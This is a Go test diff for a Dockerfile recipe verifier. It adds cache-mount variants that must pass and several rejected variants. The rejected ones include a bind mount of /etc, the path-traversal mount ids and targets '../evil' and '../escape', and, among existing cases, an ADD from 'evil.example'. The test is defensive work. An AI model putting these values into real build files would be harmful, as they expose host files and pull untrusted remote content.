@@ -115,6 +115,16 @@ func TestArtifactRecipeContextAndDockerfileDrift(t *testing.T) {
 	if err := r.VerifyContext(append(append([]byte(nil), contextBytes...), []byte("trailing-unreviewed-archive")...)); err == nil {
 		t.Fatal("trailing context accepted")
 	}
+	for _, cached := range []string{
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/go/pkg/mod [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,id=mod,target=/go/pkg/mod,sharing=locked --mount=type=cache,target=/root/.cache [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/go/pkg/mod,mode=0755,uid=0,gid=0,readonly [", 1),
+	} {
+		cachedRecipe, cachedContext := recipeFixture(t, cached)
+		if err := cachedRecipe.VerifyContext(cachedContext); err != nil {
+			t.Fatalf("rejected cache-mount Dockerfile %q: %v", cached, err)
+		}
+	}
 	for _, bad := range []string{
 		"",
 		"RUN echo x\n" + valid,
@@ -128,6 +138,11 @@ func TestArtifactRecipeContextAndDockerfileDrift(t *testing.T) {
 		strings.Replace(valid, "COPY --from=build", "COPY --chown=10001 --from=external", 1),
 		strings.Replace(valid, "RUN [", "RUN --network=host [", 1),
 		strings.Replace(valid, "RUN [", "RUN --mount=type=secret [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=bind,source=/etc,target=/x [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,from=build,target=/x [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/x --mount=type=cache,target=../escape [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/x,id=../evil [", 1),
+		strings.Replace(valid, "RUN [", "RUN --mount=type=cache [", 1),
 		"# syntax=docker/dockerfile:latest\n" + valid,
 		strings.Replace(valid, "COPY . /app", "ADD https://evil.example/file /app", 1),
 		strings.Replace(valid, "COPY . /app", "VOLUME /spaces", 1),
